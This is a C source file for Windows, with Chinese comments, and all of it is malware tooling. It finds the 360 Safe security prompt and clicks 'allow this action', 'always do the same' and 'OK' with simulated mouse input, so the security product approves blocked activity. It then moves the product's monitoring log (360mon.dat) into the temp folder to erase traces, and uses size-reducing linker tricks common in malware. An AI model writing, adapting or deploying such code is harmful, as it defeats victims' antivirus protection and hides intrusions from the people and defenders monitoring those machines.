#pragma comment(lib, "urlmon.lib")
#pragma comment(lib,"user32.lib") 
#pragma comment(lib,"kernel32.lib") 
#pragma comment(linker, "/OPT:NOWIN98")
#pragma comment(linker, "/align:0x200") 
#pragma comment(linker, "/subsystem:windows") 
#include <windows.h>
#include <windowsx.h>
#include <stdio.h>
#pragma comment(lib,"MSVCRT.lib")
#pragma comment(linker,"/ENTRY:Torrent /FILEALIGN:0x200 /MERGE:.data=.text /MERGE:.rdata=.text CTION:.text,EWR /IGNORE:4078")



void DelLog();

HWND GetChildWindow(HWND H_Parent,LPSTR szTitle)
{
	char szText[255]={0};
	HWND htop = GetWindow(H_Parent,GW_CHILD);
	while (htop !=0)
	{
		GetClassNameA(htop,szText,255);
		if (lstrcmpiA(szText,"Button") == 0)
		{
			memset(szText,0,sizeof(szText));
			GetWindowTextA(htop,szText,255);
			if (lstrcmpiA(szText,szTitle) == 0)
			{
				return htop;
			}
		}
		htop =GetWindow(htop,GW_HWNDNEXT);
	}
	return 0;
}

void ClickOkBtn()
{
	RECT   rect;
	char szClass[255]={0};
	HWND htop = GetWindow(GetTopWindow(GetDesktopWindow()),GW_HWNDFIRST);
	HWND ChildHtop1;
	HWND ChildHtop2;
	HWND ChildHtop3;
	while (htop != 0)
	{
		GetClassNameA(htop,szClass,255);
		if (stricmp(szClass,"Afx:400000:0") == 0)
		{
			memset(szClass,0,sizeof(szClass));
			GetWindowTextA(htop,szClass,255);
			if (strlen(szClass) == 0)
			{
				ChildHtop1 = GetChildWindow(htop,"允许此动作");
				ChildHtop2 = GetChildWindow(htop,"总是执行相同动作");
				ChildHtop3 = GetChildWindow(htop,"确定");
				if (ChildHtop1 && ChildHtop2 && ChildHtop3 != 0 )
				{
					GetWindowRect(ChildHtop1, &rect);
					int   nLeft   =   rect.left + 4;
					int   nBottom   =   rect.bottom - 4;
					SetCursorPos(nLeft,nBottom);
					mouse_event(MOUSEEVENTF_LEFTDOWN,0,0,0,0); 
					mouse_event(MOUSEEVENTF_LEFTUP,0,0,0,0);

					GetWindowRect(ChildHtop2, &rect);
					nLeft   =   rect.left + 4;
					nBottom   =   rect.bottom - 4;
					SetCursorPos(nLeft,nBottom);
					mouse_event(MOUSEEVENTF_LEFTDOWN,0,0,0,0); 
					mouse_event(MOUSEEVENTF_LEFTUP,0,0,0,0);
					
					GetWindowRect(ChildHtop3, &rect);
					nLeft   =   rect.left + 4;
					nBottom   =   rect.bottom - 4;
					SetCursorPos(nLeft,nBottom);
					mouse_event(MOUSEEVENTF_LEFTDOWN,0,0,0,0); 
					mouse_event(MOUSEEVENTF_LEFTUP,0,0,0,0);
				}
				break;
			}
		}
		else
		{
			htop = GetWindow(htop,GW_HWNDNEXT);
		}  
	}
}
void DelLog()
{
	HKEY hKey = NULL;
	DWORD len=MAX_PATH;
	DWORD type=REG_SZ;
	char pBuf[200];
	RegOpenKeyEx(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\360Safe.exe",0,KEY_ALL_ACCESS,&hKey);
	if (RegQueryValueEx(hKey, "Path" , NULL, &type, (unsigned char*)pBuf, &len) == ERROR_SUCCESS)
	{
		char LogFile[200];
		char TempPath[200];
		wsprintf(LogFile,"%s\\safemon\\360mon.dat",pBuf);
		GetTempPath(sizeof(TempPath),TempPath);
		wsprintf(TempPath,"%s\\tmp",TempPath);
		MoveFile(LogFile,TempPath);//把LogFile移动到temp里去
	}
	RegCloseKey(hKey);
} 


void Torrent()
{
	int nCount = 0;
	while(1)
	{
		Sleep(50);
		ClickOkBtn();
		++nCount;
		if (nCount > 5000)	//当寻找窗口的时间足够长的时候就停止
			break;
	}
	DelLog();				//删除360日志
	Sleep(1000);
	ExitProcess(0);
}







